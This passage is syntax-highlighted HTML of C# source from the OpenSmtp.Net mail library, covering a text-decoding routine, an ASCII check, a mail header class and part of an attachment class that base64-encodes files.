                            </span><span class="sc11">repl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hi</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">lo</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">sidx</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        
                        </span><span class="sc11">result</span><span class="sc10">[</span><span class="sc11">didx</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">repl</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc11">last</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">didx</span><span class="sc10">;</span><span class="sc0">
                    
                    </span><span class="sc2">// RULE # 4
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\r'</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> 
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\r'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> 
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">sidx</span><span class="sc10">++;</span><span class="sc0">
                        
                            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">idx</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">idx</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nl</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">idx</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">result</span><span class="sc10">[</span><span class="sc11">last</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nl</span><span class="sc10">[</span><span class="sc11">idx</span><span class="sc10">];</span><span class="sc0">
                                </span><span class="sc11">didx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">last</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">result</span><span class="sc10">[</span><span class="sc11">didx</span><span class="sc10">++]</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc11">ch</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc2">// RULE # 3
</span><span class="sc0">                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">' '</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'\t'</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">last</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">didx</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">didx</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">-</span><span class="sc11">nl</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">-</span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc16">char</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">newCharArray</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[(</span><span class="sc16">int</span><span class="sc10">)(</span><span class="sc11">result</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">+</span><span class="sc4">500</span><span class="sc10">)];</span><span class="sc0">
                            </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">result</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">newCharArray</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">newCharArray</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc10">(</span><span class="sc11">result</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">didx</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">IsAscii</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc2">// source char array
</span><span class="sc0">             </span><span class="sc16">char</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">ToCharArray</span><span class="sc10">();</span><span class="sc0">
             </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc10">++)</span><span class="sc0">
             </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">];</span><span class="sc0">
                 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">ch</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">127</span><span class="sc10">)</span><span class="sc0">
                 </span><span class="sc10">{</span><span class="sc0">
                     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
                 </span><span class="sc10">}</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">

             </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This Type is used to store Mail Headers
</span><span class="sc0">    </span><span class="sc15">/// &lt;seealso cref="MailMessage"/&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">MailHeader</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0"> 
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0"> 
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">body</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">MailHeader</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">headerName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">headerBody</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">headerName</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">body</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">headerBody</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Name</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0"> 
        </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0"> 
        </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0"> 
        </span><span class="sc10">}</span><span class="sc0"> 

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Body</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0"> 
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">body</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0"> 
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">body</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0"> 
        </span><span class="sc10">}</span><span class="sc0"> 

    </span><span class="sc10">}</span><span class="sc0">


</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc3">/******************************************************************************
    Copyright 2001-2005 Ian Stallings
    OpenSmtp.Net is free software; you can redistribute it and/or modify
    it under the terms of the Lesser GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    OpenSmtp.Net is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Lesser GNU General Public License for more details.

    You should have received a copy of the Lesser GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
/*******************************************************************************/</span><span class="sc0">


    </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">Microsoft</span><span class="sc10">.</span><span class="sc11">Win32</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// This Type stores a file attachment. There can be many attachments in each MailMessage
</span><span class="sc0">    </span><span class="sc15">/// &lt;seealso cref="MailMessage"/&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">    </span><span class="sc15">/// MailMessage msg = new MailMessage();
</span><span class="sc0">    </span><span class="sc15">/// Attachment a = new Attachment("C:\\file.jpg");
</span><span class="sc0">    </span><span class="sc15">/// msg.AddAttachment(a);
</span><span class="sc0">    </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">    </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">IComparable</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">     </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">     </span><span class="sc11">mimeType</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">     </span><span class="sc11">encoding</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"base64"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">     </span><span class="sc11">filePath</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">        </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">     </span><span class="sc11">encodedFilePath</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc2">// start added by mb
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0">     </span><span class="sc11">contentid</span><span class="sc10">=</span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc2">// end added by mb
</span><span class="sc0">
        </span><span class="sc15">/// &lt;summary&gt;Constructor using a file path&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;Attachment a = new Attachment("C:\\file.jpg");&lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filePath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">filePath</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filePath</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filePath</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">try</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">fileInfo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">filePath</span><span class="sc10">);</span><span class="sc0">     
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fileInfo</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">mimeType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getMimeType</span><span class="sc10">(</span><span class="sc11">fileInfo</span><span class="sc10">.</span><span class="sc11">Extension</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fileInfo</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">fileInfo</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">encodedTempFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetTempFileName</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertToBase64</span><span class="sc10">(</span><span class="sc11">filePath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">encodedTempFile</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">encodedFilePath</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">encodedTempFile</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">ArgumentNullException</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc6">"Attachment file does not exist or path is incorrect."</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">   
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Constructor using a provided Stream&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;Attachment a = new Attachment(new FileStrema(@"C:\file.jpg", FileMode.Open, FileAccess.Read), "file.jpg");&lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">(</span><span class="sc11">Stream</span><span class="sc0"> </span><span class="sc11">stream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">mimeType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"unknown/application"</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">stream</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">encodedTempFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetTempFileName</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertToBase64</span><span class="sc10">(</span><span class="sc11">stream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">encodedTempFile</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">encodedFilePath</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">encodedTempFile</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">ArgumentNullException</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc6">"Attachment file does not exist or path is incorrect."</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

    
        </span><span class="sc10">~</span><span class="sc11">Attachment</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// delete temp file used for temp encoding of large files
</span><span class="sc0">            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">encodedFilePath</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">fileInfo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">encodedFilePath</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fileInfo</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">fileInfo</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">ArgumentNullException</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt; Stores the Attachment Name&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Name</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ContentId</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">contentid</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">contentid</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc15">/// &lt;value&gt; Stores the MIME content-type of the attachment&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">MimeType</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">mimeType</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">mimeType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt; Returns the MIME content-encoding type of the attachment&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Encoding</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">encoding</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
